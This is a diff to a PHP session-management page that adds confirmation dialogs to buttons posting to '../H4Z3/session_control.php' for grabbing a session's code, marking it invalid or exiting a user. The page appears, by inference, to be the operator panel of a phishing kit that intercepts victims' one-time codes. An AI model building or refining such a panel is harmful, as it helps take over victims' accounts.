@@ -198,13 +198,13 @@ uksort($sessions, function ($a, $b) use ($sessions) {
                 ?>
                 <div class="actions">
                     <a class="export-link" href="?export=<?php echo urlencode($sessionId); ?>">Export</a>
-                    <form method="post" action="" onsubmit="return confirm('Delete this session?');">
+                    <form method="post" action="" onsubmit="return confirm('Are you sure you want to delete this session?');">
                         <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                         <input type="hidden" name="action" value="delete">
                         <button type="submit" class="action-btn danger">Delete</button>
                     </form>
                     <?php if ($shouldShowLoadingActions): ?>
-                        <form method="post" action="../H4Z3/session_control.php">
+                        <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to grab the code for this session?');">
                             <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                             <input type="hidden" name="pending_action" value="code">
                             <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
@@ -212,13 +212,13 @@ uksort($sessions, function ($a, $b) use ($sessions) {
                         </form>
                     <?php endif; ?>
                     <?php if ($shouldShowLoadingCodeActions): ?>
-                        <form method="post" action="../H4Z3/session_control.php">
+                        <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to mark the code for this session as invalid?');">
                             <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                             <input type="hidden" name="pending_action" value="invalid_code">
                             <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
                             <button type="submit" class="action-btn secondary">Invalid Code</button>
                         </form>
-                        <form method="post" action="../H4Z3/session_control.php">
+                        <form method="post" action="../H4Z3/session_control.php" onsubmit="return confirm('Are you sure you want to exit this user from the session?');">
                             <input type="hidden" name="session_id" value="<?php echo htmlspecialchars($sessionId, ENT_QUOTES, 'UTF-8'); ?>">
                             <input type="hidden" name="pending_action" value="complete">
                             <input type="hidden" name="redirect" value="<?php echo $redirectTarget; ?>">
